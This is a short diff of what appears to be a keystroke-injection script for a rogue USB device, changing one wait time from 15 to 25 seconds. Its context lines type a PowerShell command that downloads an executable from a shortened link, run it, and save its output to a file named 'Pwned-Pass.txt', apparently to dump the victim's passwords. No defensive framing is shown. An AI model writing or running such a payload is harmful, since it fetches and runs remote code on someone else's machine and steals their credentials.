@@ -12,7 +12,7 @@ ENTER
 DELAY 1000
 STRING Invoke-WebRequest 'https://tinyurl.com/5ybbuyfu' -OutFile m.exe
 ENTER
-DELAY 15000
+DELAY 25000
 STRING .\m.exe > Pwned-Pass.txt
 ENTER
 DELAY 1000
